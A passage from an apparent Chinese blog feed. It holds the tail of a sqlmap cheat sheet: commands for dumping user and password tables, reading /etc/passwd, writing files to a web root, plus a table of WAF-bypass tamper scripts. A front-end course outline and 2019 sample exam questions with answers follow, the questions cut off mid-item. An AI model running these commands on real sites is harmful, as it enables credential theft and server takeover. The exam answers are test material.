href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2</p><h5 id="8-file-read读取web文件"><a href="#8-file-read读取web文件" class="headerlink" title="8.file-read读取web文件"></a>8.file-read读取web文件</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –file-read “/etc/passwd” -v 2</p><h5 id="9-file-write写入文件到web"><a href="#9-file-write写入文件到web" class="headerlink" title="9.file-write写入文件到web"></a>9.file-write写入文件到web</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –file-write /localhost/mm.php –file-dest</p><h5 id="将本地的test-txt写入到站点服务器的html目录下"><a href="#将本地的test-txt写入到站点服务器的html目录下" class="headerlink" title="将本地的test.txt写入到站点服务器的html目录下"></a>将本地的test.txt写入到站点服务器的html目录下</h5><p>sqlmap.py -u “<a href="http://www.xxxxxx.com/sql-injection.php?id=1&quot;" target="_blank" rel="noopener">http://www.xxxxxx.com/sql-injection.php?id=1&quot;</a> –file-write /test/test.txt –file-dest /var/www/html/1.txt</p><h4 id="获取字段中的内容"><a href="#获取字段中的内容" class="headerlink" title="获取字段中的内容"></a>获取字段中的内容</h4><p>sqlmap -u “<a href="http://www.xxx.com/xx.asp?id=xxx”" target="_blank" rel="noopener">http://www.xxx.com/xx.asp?id=xxx”</a> –dump -T 表名 -C “字段名1,字段名2…”</p><h4 id="脱裤子"><a href="#脱裤子" class="headerlink" title="脱裤子"></a>脱裤子</h4><p>sqlmap.py -u url -D “data”  -T “tables” -C “username,password,email” –dump –threads=5 –start=1 –stop=5000</p><p>sqlmap.py -u url -D “data”  -T “tables” -C “username,password,email” –dump-all -v 0</p><p>sqlmap.py -u url  判断<br>sqlmap.py -u url –is-dba -v   这是判断当前数据库的使用者是否是dba<br>sqlmap.py -u url –users -v 0  这句的目的是列举数据库的用户<br>sqlmap.py -u url –passwords -v 0 这句的目的是获取数据库用户的密码<br>sqlmap.py -u url –privileges -v 0 这是判断当前的权限<br>sqlmap.py -u url –dbs -v 0 这句的目的是将所有的数据库列出来<br>sqlmap.py -u url –tables -D ‘表’ 爆表<br>sqlmap.py -u url –columns -T ‘表’-D ‘数据库’爆列<br>sqlmap.py -u url –dump -T ‘表’ –start 1 –stop 4 -v 0 这里是查询第2到第4行的内<br>sqlmap.py -u url –dump -all -v 0</p><p>sqlmap tamper</p><table><thead><tr><th>支持的数据库</th><th>编号</th><th>脚本名称</th><th>作用</th><th>实现方式</th></tr></thead><tbody><tr><td>all</td><td>1</td><td>apostrophemask.py</td><td>用utf8代替引号</td><td>(“1 AND ‘1’=’1”) ‘1 AND %EF%BC%871%EF%BC%87=%EF%BC%871’</td></tr><tr><td>2</td><td>base64encode.py</td><td>用base64编码替换</td><td>(“1’ AND SLEEP(5)#”)’MScgQU5EIFNMRUVQKDUpIw==’</td><td></td></tr><tr><td>3</td><td>multiplespaces.py</td><td>围绕SQL关键字添加多个空格</td><td>(‘1 UNION SELECT foobar’)’1    UNION     SELECT   foobar’</td><td></td></tr><tr><td>4</td><td>space2plus.py</td><td>用+替换空格</td><td>(‘SELECT id FROM users’)’SELECT+id+FROM+users’</td><td></td></tr><tr><td>5</td><td>nonrecursivereplacement.py</td><td>双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如  .replace（“SELECT”、””)） filters</td><td>(‘1 UNION SELECT 2–’)’1 UNIOUNIONN SELESELECTCT 2–’</td><td></td></tr><tr><td>6</td><td>space2randomblank.py</td><td>代替空格字符（“”）从一个随机的空白字符可选字符的有效集</td><td>(‘SELECT id FROM users’)’SELECT%0Did%0DFROM%0Ausers’</td><td></td></tr><tr><td>7</td><td>unionalltounion.py</td><td>替换UNION ALL SELECT UNION SELECT</td><td>(‘-1 UNION ALL SELECT’)’-1 UNION SELECT’</td><td></td></tr><tr><td>8</td><td>securesphere.py</td><td>追加特制的字符串</td><td>(‘1 AND 1=1’)”1 AND 1=1 and ‘0having’=’0having’”</td><td></td></tr><tr><td>mssql</td><td>1</td><td>space2hash.py</td><td>绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td><td>‘1 AND 9227=9227’ ‘1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227’</td></tr><tr><td>2</td><td>equaltolike.py</td><td>like 代替等号</td><td>* Input: SELECT * FROM users WHERE id=1 2 * Output: SELECT * FROM users WHERE id LIKE 1</td><td></td></tr><tr><td>3</td><td>space2mssqlblank.py(mssql)</td><td>空格替换为其它空符号</td><td>Input: SELECT id FROM usersOutput: SELECT%08id%02FROM%0Fusers</td><td></td></tr><tr><td>4</td><td>space2mssqlhash.py</td><td>替换空格</td><td>(‘1 AND 9227=9227’)’1%23%0AAND%23%0A9227=9227’</td><td></td></tr><tr><td>5</td><td>between.py</td><td>用between替换大于号（&gt;）</td><td>(‘1 AND A &gt; B–’)’1 AND A NOT BETWEEN 0 AND B–’</td><td></td></tr><tr><td>6</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td><td>* Input: SELECT FIELD FROM TABLE* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td><td></td></tr><tr><td>7</td><td>sp_password.py</td><td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td><td>(‘1 AND 9227=9227– ‘)’1 AND 9227=9227– sp_password’</td><td></td></tr><tr><td>8</td><td>charencode.py</td><td>url编码</td><td>* Input: SELECT FIELD FROM%20TABLE* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td></td></tr><tr><td>9</td><td>randomcase.py</td><td>随机大小写</td><td>* Input: INSERT* Output: InsERt</td><td></td></tr><tr><td>10</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td></td></tr><tr><td>11</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users* Output: SELECT//id//FROM/**/users</td><td></td></tr><tr><td>mysql &gt;= 5.1.13</td><td>1</td><td>equaltolike.py</td><td>like 代替等号</td><td>* Input: SELECT * FROM users WHERE id=1 2 * Output: SELECT * FROM users WHERE id LIKE 1</td></tr><tr><td>2</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td><td>(‘1 AND A &gt; B’)’1 AND GREATEST(A,B+1)=A’</td><td></td></tr><tr><td>3</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td><td>tamper(“1 AND ‘1’=’1”) ‘1 AND %00%271%00%27=%00%271’</td><td></td></tr><tr><td>4</td><td>ifnull2ifisnull.py</td><td>绕过对 IFNULL 过滤。替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td><td>(‘IFNULL(1, 2)’)’IF(ISNULL(1),2,1)’</td><td></td></tr><tr><td>5</td><td>space2mssqlhash.py</td><td>替换空格</td><td>(‘1 AND 9227=9227’)’1%23%0AAND%23%0A9227=9227’</td><td></td></tr><tr><td>6</td><td>modsecurityversioned.py</td><td>过滤空格，包含完整的查询版本注释</td><td>(‘1 AND 2&gt;1–’)’1 /<em>!30874AND 2&gt;1</em>/–’</td><td></td></tr><tr><td>7</td><td>space2mysqlblank.py</td><td>空格替换其它空白符号(mysql)</td><td>Input: SELECT id FROM usersOutput: SELECT%0Bid%0BFROM%A0users</td><td></td></tr><tr><td>8</td><td>between.py</td><td>用between替换大于号（&gt;）</td><td>(‘1 AND A &gt; B–’)’1 AND A NOT BETWEEN 0 AND B–’</td><td></td></tr><tr><td>9</td><td>modsecurityzeroversioned.py</td><td>包含了完整的查询与零版本注释</td><td>(‘1 AND 2&gt;1–’)’1 /<em>!00000AND 2&gt;1</em>/–’</td><td></td></tr><tr><td>10</td><td>space2mysqldash.py</td><td>替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td><td>(‘1 AND 9227=9227’)’1–%0AAND–%0A9227=9227’</td><td></td></tr><tr><td>11</td><td>bluecoat.py</td><td>代替空格字符后与一个有效的随机空白字符的SQL语句。然后替换=为like</td><td>(‘SELECT id FROM users where id = 1’)’SELECT%09id FROM users where id LIKE 1’</td><td></td></tr><tr><td>12</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td><td>* Input: SELECT FIELD FROM TABLE* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td><td></td></tr><tr><td>13</td><td>charencode.py</td><td>url编码</td><td>* Input: SELECT FIELD FROM%20TABLE* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td></td></tr><tr><td>14</td><td>randomcase.py</td><td>随机大小写</td><td>* Input: INSERT* Output: InsERt</td><td></td></tr><tr><td>15</td><td>versionedkeywords.py</td><td>Encloses each non-function keyword with versioned MySQL comment</td><td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#* Output: 1/<em>!UNION<strong>!ALL</strong>!SELECT**!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS**!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</td><td></td></tr><tr><td>16</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users* Output: SELECT//id//FROM/**/users</td><td></td></tr><tr><td>17</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td></td></tr><tr><td>18</td><td>versionedmorekeywords.py</td><td>注释绕过</td><td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#* Output: 1/<em>!UNION<strong>!ALL</strong>!SELECT**!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS**!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</td><td></td></tr><tr><td>MySQL &lt; 5.1</td><td>19</td><td>halfversionedmorekeywords.py</td><td>关键字前加注释</td><td>* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa* Output: value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)), NULL, NULL#/</em>!0AND ‘QDWa’=’QDWa</td></tr><tr><td>20</td><td>halfversionedmorekeywords.py</td><td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td><td>1.(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)2.”value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa”</td><td></td></tr><tr><td>MySQL &gt;= 5.1.13</td><td>21</td><td>space2morehash.py</td><td>空格替换为 #号 以及更多随机字符串 换行符</td><td>* Input: 1 AND 9227=9227* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</td></tr><tr><td>Oracle</td><td>1</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td><td>(‘1 AND A &gt; B’)’1 AND GREATEST(A,B+1)=A’</td></tr><tr><td>2</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td><td>tamper(“1 AND ‘1’=’1”) ‘1 AND %00%271%00%27=%00%271’</td><td></td></tr><tr><td>3</td><td>between.py</td><td>用between替换大于号（&gt;）</td><td>(‘1 AND A &gt; B–’)’1 AND A NOT BETWEEN 0 AND B–’</td><td></td></tr><tr><td>4</td><td>charencode.py</td><td>url编码</td><td>* Input: SELECT FIELD FROM%20TABLE* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td></td></tr><tr><td>5</td><td>randomcase.py</td><td>随机大小写</td><td>* Input: INSERT* Output: InsERt</td><td></td></tr><tr><td>6</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td></td></tr><tr><td>7</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users* Output: SELECT//id//FROM/**/users</td><td></td></tr><tr><td>PostgreSQL</td><td>1</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td><td>(‘1 AND A &gt; B’)’1 AND GREATEST(A,B+1)=A’</td></tr><tr><td>2</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td><td>tamper(“1 AND ‘1’=’1”) ‘1 AND %00%271%00%27=%00%271’</td><td></td></tr><tr><td>3</td><td>between.py</td><td>用between替换大于号（&gt;）</td><td>(‘1 AND A &gt; B–’)’1 AND A NOT BETWEEN 0 AND B–’</td><td></td></tr><tr><td>4</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td><td>* Input: SELECT FIELD FROM TABLE* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td><td></td></tr><tr><td>5</td><td>charencode.py</td><td>url编码</td><td>* Input: SELECT FIELD FROM%20TABLE* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td></td></tr><tr><td>6</td><td>randomcase.py</td><td>随机大小写</td><td>* Input: INSERT* Output: InsERt</td><td></td></tr><tr><td>7</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td></td></tr><tr><td>8</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users* Output: SELECT//id//FROM/**/users</td><td></td></tr><tr><td>Access</td><td>1</td><td>appendnullbyte.py</td><td>在有效负荷结束位置加载零字节字符编码</td><td>(‘1 AND 1=1’)’1 AND 1=1%00’</td></tr><tr><td>其他</td><td></td><td>chardoubleencode.py</td><td>双url编码(不处理以编码的)</td><td>* Input: SELECT FIELD FROM%20TABLE* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td></tr><tr><td></td><td>unmagicquotes.py</td><td>宽字符绕过 GPC  addslashes</td><td>* Input: 1′ AND 1=1* Output: 1%bf%27 AND 1=1–%20</td><td></td></tr><tr><td></td><td>randomcomments.py</td><td>用/**/分割sql关键字</td><td>‘INSERT’ becomes ‘IN//S//ERT’</td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> safe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1+x 证书 web 前端开发基础课程大纲</title>
      <link href="/posts/d65b.html"/>
      <url>/posts/d65b.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-x-证书-web-前端开发基础课程大纲"><a href="#1-x-证书-web-前端开发基础课程大纲" class="headerlink" title="1+x 证书 web 前端开发基础课程大纲"></a>1+x 证书 web 前端开发基础课程大纲</h1><p>前端开发是创建 Web 页面或 app 等前端界面呈现给用户的过程。前端开发通过 HTML，CSS 及 JavaScript 以及衍生出来的各种技术、框架、解决方案，来实现互联网产品的用户界面交互。Web 前端工程师，他是伴随着 web 兴起而细分进去的行业。Web 前端的岗位职责是利用 HTML、CSS、JavaScript、DOM、Flash 等各种 Web 技能结合产品的界面开发。web 前端开发入门教程要学哪些内容呢？</p><p>首先第一阶段就是基础学习，</p><p>1.HTML 基础</p><p>内容包括：（HTML 简介与历史版本、常用开发软件、常见标签与属性、</p><p>表格与表单、标签规范与标签语义化、实战：网页结构布局）</p><p>2.CSS 基础</p><p>内容包括：（css 简介与基本语法、常见的各种样式属性、CSS 选择器与标签类型、理解盒子模型与 CSS 重置、浮动与定位、利用 photoshop 工具测量样式、HTML+CSS 开发网页、实战：高仿电商首页效果）</p><p>3.CSS3 基础</p><p>内容包括：（css3 常见样式、css3 选择器、变形与动画、3D 效果与关键帧、弹性盒模型、5. 移动端布局、移动端基本概念、viewport 窗口设置、移动端布局方案、rem、vh、vw 等单位、响应式布局、bootstrap 框架）</p><p>4、JavaScript 基础</p><p>内容包括：（JS 简介、JS 变量、数据类型与类型转换、运算符与优先级、</p><p>流程控制 - if…else 流程控制 - switch…case、流程控制 - while、do…while、for 循环、break、continue 语法、函数定义与调用、全局变量与局部变量、函数传参与返回值、函数作用域与变量作用域、DOM 的基本操作、定时器使用、this 指向与修改指向、数组、字符串等方法操作、时间对象与正则对象、掌握常见 BOM 操作、常见事件与事件细节、JSON 与 AJAX、JSONP 跨域操作、前端 cookie 的使用、实战：JS 配合 HTML 与 CSS 完成电商项目）</p><p>5.jquery 框架</p><p>内容包括：（jquery 框架介绍及优势介绍、jquery 核心思想、jquery 常见方法、jquery 动画操作、jqueryAJAX 操作、jquery 工具方法、利用 jquery 快速开发网页）</p><p>6.PHP 基础</p><p>内容包括：（PHP 简介与基本语法、mysql 数据库及 sql 语法、apache 服务器与集成开发工具、PHP 链接数据库、PHP 与 AJAX 交互、实战：留言板、登录、注册等）</p><p>7、H5 基础项目</p><p>内容包括：（项目简介、项目功能演示、项目划分及框架、编写 HTML 页面结构、设置 CSS 样式、添加 JS 交互、可选框架：bootstrap、jquery、PHP 等、项目调试及兼容、项目验收）</p><p>因为我们是从零基础开始学习的，所以基础知识是至关重要的。”学习 HTML5 的过程就是盖楼房的过程，如果你基础知识没有学好，就等于一栋楼房的地基没有夯实。后期的学习会难上加难。” 同时，基础知识不能只依靠课上学习的那点知识，一定要通过线上或者翻阅一些 HTML5 相关的书籍来增加自身的知识储备量。</p><p>要掌握一定的编程技巧，这样在以后的工作中可以大大的提高工作效率。</p><h1 id="1-HTML"><a href="#1-HTML" class="headerlink" title="1.HTML"></a><strong>1.HTML</strong></h1><p><strong>技能要求：</strong></p><ol><li>能熟练使用 HTML 文本标签、头部标记、页面创建超链接、创建表格表单功能搭建静态网页</li><li>能熟练使用 HTML 文本标签、图像、头部标记、页面创建超链接、创建表格表单及 iframe 框架等功能美化网页</li><li>能熟练使用 HTML5 新增语义化元素、页面增强元素与属性及多媒体元素等功能美化页面、开发移动端页面</li></ol><p><strong>知识要求：</strong></p><p>+ 掌握并熟练应用 HTML 文本标签、头部标记、页面创建超链接、创建表格表单功能</p><p>+ 掌握 HTML 在网页中嵌入多媒体、使用框架结构、网页中使用表格创建表单的使用方法</p><p>+ 掌握、理解 HTML5 新增全局属性、结构化与页面增强、表单标签、多媒体元素的使用方法</p><h1 id="2-CSS"><a href="#2-CSS" class="headerlink" title="2.CSS"></a><strong>2.CSS</strong></h1><p><strong>技能要求：</strong></p><ol><li>能熟练使用 CSS 设计、美化网页样式</li><li>能熟练使用 Hack 原理实现 CSS 中的样式效果</li><li>能熟练使用 CSS3 的选择器、盒模型、过渡、动画等属性美化网页</li><li>使用 em/rem/vw/vh 等单位开发移动端网页，达到美化网页的效果</li><li>能熟练使用 CSS3 的选择器、背景、盒模型、渐变、多列布局等属性开发动态网页</li></ol><p><strong>知识要求：</strong></p><p>+ 掌握 CSS 的区块、网页布局属性的使用方法</p><p>+ 掌握 CSS 的选择器、单位、字体样式、文本样式、颜色、背景的使用方法</p><p>+ 掌握 CSS3 选择器在页面中插入各种盒子模型、背景样式使用方法</p><p>+ 掌握 CSS3 特性、动画效果、多列布局以及弹性布局的使用方法</p><p>+ 掌握 CSS3 选择器、边框特性、颜色、字体、盒阴影、背景特性、盒模型、渐变功能的使用方法</p><hr><h1 id="3-JavaScript"><a href="#3-JavaScript" class="headerlink" title="3.JavaScript"></a><strong>3.JavaScript</strong></h1><p><strong>技能要求：</strong></p><ol><li>能熟练使用 JavaScript 开发交互效果页面</li><li>能熟练使用运算等基础语言和内置函数实现数据交互</li><li>能熟练使用 JavaScript 对象和 DOM 编程实现交互效果页面</li><li>能熟练使用 Ajax 中的 XML、JSON 数据格式与网站后端进行数据交互</li><li>能熟练使用 jQuery 选择器、jQuery 中的 DOM 操作、滚动、图表、布局、文字处理及 UI 等插件、jQuery 事件和动画等开发交互效果页面</li></ol><p><strong>知识要求：</strong></p><p>+ 掌握 JavaScript 基础语言、函数、面向对象功能的使用方法</p><p>+ 掌握 Ajax 技术，实现异步刷新，异步获取数据的使用方法</p><p>+ 掌握 jQuery 中选择、插件、事件和动画功能的使用方法</p><hr><h1 id="4-MySQL"><a href="#4-MySQL" class="headerlink" title="4.MySQL"></a><strong>4.MySQL</strong></h1><p><strong>技能要求：</strong></p><ol><li>能使用 MySQL 基本操作进行数据管理</li></ol><p><strong>知识要求：</strong></p><p>+ 掌握 MySQL 中创建表、设置约束、设置自增型字段、表结构的复制、修改表、修改字段、修改约束条件、修改表名、删除表、数据的插入 / 修改 / 查询 / 存储、触发器、事务、视图的使用方法</p><hr><h1 id="5-PHP"><a href="#5-PHP" class="headerlink" title="5.PHP"></a><strong>5.PHP</strong></h1><p><strong>技能要求：</strong></p><ol><li>能熟练使用 PHP 的编码技术操作 Mysql 数据库，进行动态网站开发。</li><li>能使用 Session 的操作、Cookie 的操作开发动态网站</li><li>能根据 HTTP 协议方法定义操作，能使用 API 进行数据筛选、支持大型二进制资源的部分响应与后端进行交互</li><li>能熟练使用 Laravel 的路由、控制器、Blade 模板、前端组件构建动态网站</li></ol><p><strong>知识要求：</strong></p><p>+ 掌握 PHP 的基础操作、数组函数、面向对象、基本语法、数据类型、数据输出、编码规范、常量、变量、PHP 运算符、数据类型转换、条件判断语句、循环控制语句、跳转语句和终止语句、一维数组、二维数组、遍历与输出数组、函数、PHP 操作 MySQL 数据库、管理 MySQL 数据库中数据的使用方法</p><p>+ 掌握基本的 API 设计方法</p><p>+ 掌握 Laravel 框架构建动态网站的使用方法</p><hr><h1 id="6-Bootstrap"><a href="#6-Bootstrap" class="headerlink" title="6.Bootstrap"></a><strong>6.Bootstrap</strong></h1><p><strong>技能要求：</strong></p><ol><li>能使用 Bootstrap 栅格系统、基本样式、组件、Less 和 Sass、插件、Bootstrap 定制及优化、Bootstrap 内核解码开发响应式页面</li></ol><p><strong>知识要求：</strong></p><p>+ 掌握 Bootstrap 布局、组件、基本样式、插件、组件的使用方法</p>]]></content>
      
      
      <categories>
          
          <category> 大前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大全 </tag>
            
            <tag> 大纲 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1+x中级理论考试样题 2019</title>
      <link href="/posts/4a64.html"/>
      <url>/posts/4a64.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-x中级理论考试样题-2019"><a href="#1-x中级理论考试样题-2019" class="headerlink" title="1+x中级理论考试样题 2019"></a>1+x中级理论考试样题 2019</h1><h2 id="一、单选题-每小题-2-分，共-60-分"><a href="#一、单选题-每小题-2-分，共-60-分" class="headerlink" title="一、单选题 (每小题 2 分，共 60 分)"></a>一、单选题 (每小题 2 分，共 60 分)</h2><p>1、在 Bootstrap 框架中，表单元素 <code>&lt;input&gt;</code> 要加上下列哪个类，才能给表单元素 &lt; input &gt; 添加圆角属性和阴影效果（）。D<br>A、.form-group<br>B、.form-horizontal<br>C、.form-inline<br>D、.form-control</p><p>2、Bootstrap 框架中的.img-responsive 类可以让图片支持响应式布局，它的实现原理是（）。 A<br>A、设置 max-width:100%; 和 height:auto;<br>B、设置 max-width:100%; 和 height:100%;<br>C、设置 width:auto; 和 max-height:100%;<br>D、设置 width:auto; 和 height:auto;</p><p>3、在移动端使用 Bootstrap 时，导航条在屏幕显示时会被折叠，实现显示和折叠功能的按钮需要如何处理（）。 B<br>A、折叠按钮设置 data-toggle=’collapsed’，折叠容器需要添加 collapsed 类<br>B、折叠按钮设置 data-toggle=’collapse’，折叠容器需要添加 collapse 类<br>C、折叠按钮设置 data-toggle=’scroll’，折叠容器需要添加 collapse 类<br>D、折叠按钮设置 data-spy=’scroll’，折叠容器需要添加 collapse 类</p><p>4、在 Bootstrap 中实现.nav 的内容按比例填充所有可用空间，应该加哪个类（）。 B<br>A、.nav-center<br>B、.nav-fill<br>C、.nav-left<br>D、.nav-right</p><p>5、在 Bootstrap 中，使用 tab 标签页插件，要显示的内容要放在下方哪个容器里面（）。 D<br>A、.content<br>B、.tab-group<br>C、.tab-body<br>D、.tab-content</p><p>6、以下哪个标签不是 HTML5 的语义化标签（）。 C<br>A、<code>&lt;header&gt;&lt;/header&gt;</code><br>B、<code>&lt;section&gt;&lt;/section&gt;</code><br>C、<code>&lt;marquee&gt;&lt;/marquee&gt;</code><br>D、<code>&lt;article&gt;&lt;/article&gt;</code></p><p>7、在使用 css3 盒模型时，box-sizing 属性设置为（），元素的宽度只是该元素内容的宽度，而不包括边框和内边距的宽度。 A<br>A、content-box<br>B、border-box<br>C、text-box<br>D、none</p><p>8、实现一个 css3 线性渐变效果，渐变的方向是从右上角到左下角，起点颜色是从白色到黑色，以下写法正确的是（）。 D<br>A、background:linear-gradient(225deg,rgba(0,0,0,1),rgba(255,255,255,1));<br>B、background:linear-gradient(-135deg,hsla(120,100%,0%,1),hsla(240,100%,100%,1));<br>C、background:linear-gradient(to top left,white,black);<br>D、background: linear-gradient(to bottom left, white, black);</p><p>9、使用 css3 过渡效果 “transition: width .5s ease-in .1s;”，其中 “.5s” 对应的属性是（）。 B<br>A、transition-property：对象中的参与过渡的属性<br>B、transition-duration：对象过渡的持续时间<br>C、transition-timing-function：对象中过渡的动画类型<br>D、transition-delay：对象延迟过渡的时间</p><p>10、使用 SQL 语句创建数据库，数据库名为 mytest，下列 SQL 语句写法是正确的是（）。 D<br>A、createmytest<br>B、createtablemytest<br>C、databasemytest<br>D、createdatabasemytest</p><p>11、下列哪项为查找结果按照学号降序排列（）。 B<br>A、ORDERBYDESCStuNum<br>B、ORDERBYStuNumDESC<br>C、ORDERBYStuNumASC<br>D、ORDERBYASCStuNum</p><p>12、在视图上不能完成的操作是（）。 D<br>A、查询<br>B、在视图上定义新的视图<br>C、更新视图<br>D、在视图上定义新的表</p><p>13、用于将事务处理写到数据库的命令是（）。 C<br>A、insert<br>B、rollback<br>C、commit<br>D、savepoint</p><p>14、关于 PHP，下列说法错误的是（）。 C<br>A、开发 PHP 网页所使用的脚本语言是 PHP<br>B、网页中的 PHP 代码同 html 标记符一样，必须用分隔符”&lt;” 和”&gt;” 将其括起来<br>C、PHP 网页，运行时在客户端可查看到真实的 PHP 源代码<br>D、PHP 和 html 可混合编程</p><p>15、以下 PHP 变量名不正确的是（）。 C<br>A、$_beijing<br>B、$_Beijing<br>C、$9Beijing<br>D、$Beijing</p><p>16、array_push () 的作用是（）。 C<br>A、将数组的第一个元素弹出<br>B、将数组的最后一个元素弹出<br>C、将一个或多个元素压入数组的末尾<br>D、将一个或多个元素插入数组的开头</p><p>17、以下关于继承的说法错误的是（）。 C<br>A、一个类可以在声明中用 extends 关键字继承另一个类的方法和属<br>B、如果父类中的方法被声明为 final，则子类无法覆盖该方法<br>C、PHP 可以多重继承，一个类可以继承多个父类<br>D、属性不能被定义为 final，只有类和方法才能被定义为 final</p><p>18、执行以下代码，输出结果是（）。D</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584720293640.png" alt="第 18 题图"></p><p>A、echo class a something echo class b something</p><p>B、echo class b something echo class a something</p><p>C、echo class a something</p><p>D、echo class b something</p><p>19、下面有关 PHP 中 require () 和 include () 的描述，说法错误的是（）。 D<br>A、require 函数通常放在 PHP 程序的最前面<br>B、include 函数一般是放在流程控制的处理部分中<br>C、require_once 语句和 require 语句完全相同，唯一区别是 PHP 